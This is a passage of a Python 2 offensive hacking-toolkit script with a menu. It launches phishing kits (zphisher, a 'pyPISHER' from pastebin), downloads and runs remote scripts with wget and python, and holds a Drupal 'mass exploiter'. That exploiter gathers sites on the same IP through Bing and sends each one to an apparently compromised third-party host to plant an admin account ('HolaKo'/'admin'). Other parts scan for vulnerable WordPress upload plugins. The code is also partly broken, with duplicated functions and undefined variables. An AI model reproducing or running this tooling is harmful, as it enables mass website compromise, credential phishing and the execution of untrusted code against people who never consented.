        menu()
    elif choice5 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def social():
    print('''\033[91m
              
    .dP"Y8  dP"Yb   dP""b8 88    db    88     
    `Ybo." dP   Yb dP   `" 88   dPYb   88     
    o.`Y8b Yb   dP Yb      88  dP__Yb  88  .o 
    8bodP'  YbodP   YboodP 88 dP""""Yb 88ood8 

    [!] Social Engineering Tools [!]
         
 \033[0m''')
    print("   {1}--Setoolkit ")
    print("   {2}--SSLtrip")
    print("   {3}--pyPISHER")
    print("   {4}--ZPISHER")
    #print("   {4}--SMTP Mailer \n ")
    print("   {99}-Back To Main Menu \n\n")
    choice6 = raw_input("SocialEngineering >> ")
    if choice6 == "1":
        clearScr()
        setoolkit()
    if choice6 == "2":
        clearScr()
        ssls()
    if choice6 == "3":
        clearScr()
        pisher()
    if choice6 == "4":
        clearScr()
        zpisher()
    #if choice6 == "4":
        #clearScr()
        #smtpsend()
    if choice6 == "99":
        clearScr()
        menu()
    elif choice6 == "":
        clearScr()
        menu()
    else:
        clearScr()
        menu()


def cmsfew():
    print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
    target = raw_input("Select a target : ")
    os.system(
        "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
    os.system("python cms.py %s" % target)


def smtpsend():
    os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
    clearScr()
    os.system("python smtp.py")


def pisher():
    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
    clearScr()
    os.system("python pisher.py")


def zpisher():
    print('''\033[91m
                  
    8888P 88""Yb 88  88 88 .dP"Y8 88  88 888888 88""Yb 
      dP  88__dP 88  88 88 `Ybo." 88  88 88__   88__dP 
     dP   88"""  888888 88 o.`Y8b 888888 88""   88"Yb  
    d8888 88     88  88 88 8bodP' 88  88 888888 88  Yb 
 
    [!] ZPhisher Tool [!]
         
 \033[0m''')
    print("   {1}--Kali Linux ")
    print("   {2}--Termux")
    print("   {99}-Back To Main Menu \n")
    choiceweb = raw_input("ZPhisher~# ")
    if choiceweb == "1":
        clearScr()
        zpishkali()
    if choiceweb == "2":
        clearScr()
        zpishtermux()
    elif choiceweb == "99":
        clearScr()
        social()
    elif choiceweb == "":
        clearScr()
        social()
    else:
        clearScr()
        social()


def zpishkali():
    os.system("git clone https://github.com/htr-tech/zphisher.git")
    os.system("cd zphisher && bash zphisher.sh")
    clearScr()
    social()
    
def zpishtermux():
    os.system("pkg install tur-repo")
    os.system("pkg install zphisher && zphisher")
    clearScr()
    social()

def unique(seq):
    """
    get unique from list found it on stackoverflow
    """
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def clearScr():
    """
    clear the screen in case of GNU/Linux or
    windows
    """
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')




############################
minu = '''
\t 1: Drupal Bing Exploiter
\t 2: Get Drupal Websites
\t 3: Drupal Mass Exploiter
\t 99: Back To Main Menu
'''


def drupal():
    '''Drupal Exploit Binger All Websites Of server '''
    ip = raw_input('1- IP : ')
    page = 1
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + "&go=Valider&qs=n&form=QBRE&pq=ip%3A" + \
            ip + "&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first=" + \
            str(page)
        req = urllib2.Request(url)
        opreq = urllib2.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            try:

                urlpa = urlparse(url)
                site = urlpa.netloc

                print "[+] Testing At " + site
                resp = urllib2.urlopen(
                    'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                read = resp.read()
                if "User : HolaKo" in read:
                    print "Exploit found =>" + site

                    print "user:HolaKo\npass:admin"
                    a = open('up.txt', 'a')
                    a.write(site + '\n')
                    a.write("user:" + user + "\npass:" + pwd + "\n")
                else:
                    print "[-] Expl Not Found :( "

            except Exception as ex:
                print ex
                sys.exit(0)

        # Drupal Server ExtraCtor


def getdrupal():
    ip = raw_input('Enter The Ip :  ')
    page = 1
    sites = list()
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + \
            "+node&go=Valider&qs=ds&form=QBRE&first=" + str(page)
        req = urllib2.Request(url)
        opreq = urllib2.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            split = urlparse(url)
            site = split.netloc
            if site not in sites:
                print site
                sites.append(site)

        # Drupal Mass List Exploiter


def drupallist():
    listop = raw_input("Enter The list Txt ~# ")
    fileopen = open(listop, 'r')
    content = fileopen.readlines()
    for i in content:
        url = i.strip()
        try:
            openurl = urllib2.urlopen(
                'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
            readcontent = openurl.read()
            if "Success" in readcontent:
                print "[+]Success =>" + url
                print "[-]username:HolaKo\n[-]password:admin"
                save = open('drupal.txt', 'a')
                save.write(
                    url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")

            else:
                print i + "=> exploit not found "
        except Exception as ex:
            print ex


def maine():

    print minu
    choose = raw_input("choose a number : ")
    while True:

        if choose == "1":
            drupal()
        if choose == "2":
            getdrupal()
        if choose == "3":
            drupallist()
        if choose == "4":
            about()
        if choose == "99":
            clearScr()
            menu()
        con = raw_input('Continue [Y/n] -> ')
        if con[0].upper() == 'N':
            exit()
        if con[0].upper() == 'Y':
            
            maine()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_joomla(sites):
    joomla = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'administrator').getcode() == 200:
                joomla.append(site)
        except:
            pass

    return joomla


def wppjmla():

    ipp = raw_input('Enter Target IP : ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print ss
    print '[+] Found ! ', len(wordpress), ' Wordpress Websites'
    print '-' * 30 + '\n'
    for ss in joomla:
        print ss

    print '[+] Found ! ', len(joomla), ' Joomla Websites'

    print '\n'
# initialise the fscan function


class dzz():
    def __init__(self):
        clearScr()
        aaa = raw_input("Target IP : ")
        Fscan(aaa)
############################


class bcolors:
    HEADER = ''
    OKBLUE = ''
    OKGREEN = ''
    WARNING = ''
    FAIL = ''
    ENDC = ''
    CYAN = ''


class colors():
    PURPLE = ''
    CYAN = ''
    DARKCYAN = ''
    BLUE = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    BOLD = ''
    ENDC = ''


def grabsqli(ip):
    try:
        print bcolors.OKBLUE + "Check_Uplaod... "
        print '\n'

        page = 1
        while page <= 21:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                ip + "+upload&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            sites = findwebs
            for i in sites:
                try:
                    response = urllib2.urlopen(i).read()
                    checksqli(i)
                except urllib2.HTTPError, e:
                    str(sites).strip(i)

            page = page + 10
    except:
        pass


def checksqli(sqli):
    responsetwo = urllib2.urlopen(sqli).read()
    find = re.findall('type="file"', responsetwo)
    if find:
        print(" Found ==> " + sqli)


def sqlscan():
    ip = raw_input('Enter IP -> ')
    grabsqli(ip)


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_wpstorethemeremotefileupload(sites):
    wpstorethemeremotefileupload = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/themes/WPStore/upload/index.php').getcode() == 200:
                wpstorethemeremotefileupload.append(site)
        except:
            pass

    return wpstorethemeremotefileupload


def check_wpcontactcreativeform(sites):
    wpcontactcreativeform = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200:
                wpcontactcreativeform.append(site)
        except:
            pass

    return wpcontactcreativeform


def check_wplazyseoplugin(sites):
    wplazyseoplugin = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200:
                wplazyseoplugin.append(site)
        except:
            pass

    return wplazyseoplugin


def check_wpeasyupload(sites):
    wpeasyupload = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200:
                wpeasyupload.append(site)
        except:
            pass

    return wpeasyupload


def check_wpsymposium(sites):
    wpsymposium = []
    for site in sites:
        try:
            if urllib2.urlopen(site + 'wp-symposium/server/file_upload_form.php').getcode() == 200:
                wpsycmium.append(site)
        except:
            pass

    return wpsymposium


def wpminiscanner():
    ip = raw_input('Enter IP : ')
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
    wpcontactcreativeform = check_wpcontactcreativeform(sites)
    wplazyseoplugin = check_wplazyseoplugin(sites)
    wpeasyupload = check_wpeasyupload(sites)
    wpsymposium = check_wpsymposium(sites)
    for ss in wordpress:
        print ss
    print '[*] Found, ', len(wordpress), ' wordpress sites.'
    print '-' * 30 + '\n'
    for ss in wpstorethemeremotefileupload:
        print ss
    print '[*] Found, ', len(wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
    print '-' * 30 + '\n'
    for ss in wpcontactcreativeform:
        print ss
    print '[*] Found, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
    print '-' * 30 + '\n'
    for ss in wplazyseoplugin:
        print ss
    print '[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
    print '-' * 30 + '\n'
    for ss in wpeasyupload:
        print ss
    print '[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.'
    print '-' * 30 + '\n'
    for ss in wpsymposium:
        print ss

    print '[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.'

    print '\n'
############################


if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(" Finishing up...\r"),
        time.sleep(0.25)
